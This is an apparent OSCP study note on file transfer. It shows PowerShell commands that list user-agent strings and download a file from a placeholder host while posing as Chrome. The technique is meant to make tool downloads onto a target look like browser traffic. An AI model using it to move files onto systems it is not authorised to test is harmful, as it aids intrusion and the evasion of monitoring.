---
permalink: oscp/techniques/file-transfer/untitled-6
title: Untitled
type: note
---
## Changing User Agent

#### Listing User Agents
```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

#### Example Request with Chrome User Agent
```powershell
$UserAgent =[Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
```

```powershell
 Invoke-WebRequest http://<IP>/<FILE> -UserAgent $UserAgent -OutFile "<PATH TO SAVE FILE TO>/<FILE>"
```
